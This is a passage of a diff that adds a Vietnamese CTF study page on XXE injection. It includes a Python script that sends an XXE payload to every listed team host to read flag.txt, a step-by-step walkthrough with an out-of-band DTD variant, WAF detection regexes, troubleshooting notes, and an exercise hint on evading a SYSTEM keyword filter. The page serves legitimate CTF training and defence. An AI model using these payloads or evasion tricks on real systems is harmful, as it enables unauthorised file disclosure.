+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+XML_PAYLOAD = <span class="s">'''&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;'''</span>
+
+<span class="k">def</span> <span class="d">exploit_xxe</span>(host):
+    <span class="k">try</span>:
+        r = requests.post(<span class="s">f"http://{host}/import"</span>, data=XML_PAYLOAD,
+                headers={<span class="s">"Content-Type"</span>: <span class="s">"application/xml"</span>}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_xxe(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service cho upload file "import profile" đuôi <code>.xml</code>, hiển thị lại tên/bio sau khi import.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Thử payload A</div><div class="d">Upload XML với entity trỏ <code>/etc/hostname</code> → Response (phần hiển thị bio) hiện đúng tên máy chủ ⟹ xác nhận XXE, app CÓ in trực tiếp giá trị entity.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Đọc flag</div><div class="d">Đổi entity trỏ <code>file:///flag.txt</code> → Response hiện <code>FHACKER2026{...}</code> ngay ở phần bio.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08.</div></div></div>
+  </div>
+  <div class="note"><span class="tag">Nếu bước 2 không hiện gì</span>Chuyển sang kỹ thuật Blind/OOB (mục 06.B):
+  dựng <code>python3 -m http.server</code> trên máy mình, host <code>evil.dtd</code>, đổi payload trỏ ra file DTD
+  đó, rồi xem log server của mình để lấy flag thay vì đọc trực tiếp response.</div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex)</th><th>Khớp gì</th></tr>
+    <tr><td><code>&lt;!DOCTYPE</code></td><td>Hầu hết XML hợp lệ của ứng dụng (không phải do người dùng upload) không cần khai DOCTYPE tùy chỉnh — chặn tương đối an toàn nếu app không dùng DTD cho mục đích khác</td></tr>
+    <tr><td><code>&lt;!ENTITY.*SYSTEM</code></td><td>Khai báo external entity — dấu hiệu gần như chắc chắn là tấn công, hiếm khi là nhu cầu hợp lệ</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Nếu app thật sự cần DTD cho việc khác (hiếm),
+  kiểm tra kỹ trước khi chặn toàn bộ <code>&lt;!DOCTYPE</code>. Cách phòng thủ tốt hơn WAF (nếu có quyền sửa code
+  — nhưng A/D không cho sửa source) là tắt hẳn external entity trong cấu hình parser; ở đây ta chỉ có WAF nên
+  chặn theo payload là cách khả thi duy nhất.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Lỗi "DOCTYPE is not allowed" hoặc tương tự</td><td>Parser đã cấu hình chặn DOCTYPE hoàn toàn (an toàn)</td><td>Không khai thác được qua XXE kinh điển, thử hướng khác</td></tr>
+    <tr><td>Response 200 bình thường nhưng không thấy nội dung file</td><td>App không in trực tiếp giá trị entity ra response (nhưng vẫn có thể đã resolve ngầm)</td><td>Chuyển sang Blind/OOB (mục 06.B) hoặc Error-based (mục 06.C)</td></tr>
+    <tr><td>OOB không thấy request nào tới listener</td><td>Server mục tiêu không có đường mạng tới IP bạn (firewall nội bộ, khác VLAN), hoặc sai IP</td><td>Kiểm tra lại đúng IP máy bạn trong mạng thi đấu; nếu vẫn không có route, parser có thể đã chặn external entity hoàn toàn</td></tr>
+    <tr><td>File Office (docx) upload không kích hoạt XXE</td><td>App không tự parse XML bên trong file Office, chỉ lưu nguyên file</td><td>Không phải lỗ hổng ở đây, cần tìm endpoint khác thực sự parse nội dung</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Parser XML cấu hình mặc định cũ/không an toàn (nhiều thư viện Java, PHP <code>libxml</code> nếu không gọi hàm tắt, một số bản <code>lxml</code> Python cũ).</td></tr>
+    <tr><td>❌</td><td>Parser đã tắt hẳn DOCTYPE/external entity (mặc định của Python 3.7+ <code>xml.etree.ElementTree</code>, hay nhiều framework hiện đại).</td></tr>
+    <tr><td>❌</td><td>App dùng JSON thuần, không có đường nào chấp nhận XML dù đổi Content-Type.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ upload XML thường tới khi đọc được flag.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thử đọc file nhỏ/quen thuộc trước (<code>/etc/hostname</code>) để xác
+  nhận cơ chế hoạt động, trước khi đoán đường dẫn flag thật.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> challenge không in giá trị entity ra response (app chỉ trả "Import thành
+  công"). Dựng listener OOB để lấy flag.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ dùng parameter entity (<code>%</code>) thay vì entity thường trong
+  file DTD ngoài — đây là lỗi hay gặp nhất khi mới làm quen kỹ thuật này.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> challenge chặn chữ <code>SYSTEM</code> theo blacklist từ khóa trong WAF.
+  Payload XXE còn cách nào khác để khai báo external entity không dùng đúng từ <code>SYSTEM</code> nguyên văn?</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thử biến thể hoa/thường <code>SyStEm</code> (XML không phân biệt hoa
+  thường ở từ khóa DTD tùy implementation) hoặc chia nhỏ payload qua nhiều entity lồng nhau để né pattern matching
+  đơn giản.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>DTD</td><td>Khối khai báo cấu trúc/entity ở đầu tài liệu XML.</td></tr>
+    <tr><td>Entity / External entity</td><td>"Biến" trong XML; loại external trỏ ra file/URL ngoài, được parser tự mở.</td></tr>
+    <tr><td>Parameter entity (<code>%</code>)</td><td>Loại entity đặc biệt chỉ dùng được bên trong chính DTD, cần cho kỹ thuật OOB.</td></tr>
+    <tr><td>OOB (Out-of-Band)</td><td>Kỹ thuật lấy dữ liệu ra qua một kênh phụ (ở đây là HTTP request tới server của kẻ tấn công) khi không đọc được trực tiếp từ response.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/XXE Injection/</code>,
+  <code>~/hoc/CTF/Tools/web/SecLists/Fuzzing/XXE-Fuzzing.txt</code>, <code>~/hoc/CTF/Tools/web/CyberChef/</code>,
+  Python <code>http.server</code> (có sẵn, không cần cài) cho listener OOB.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("xxe-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("xxe-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
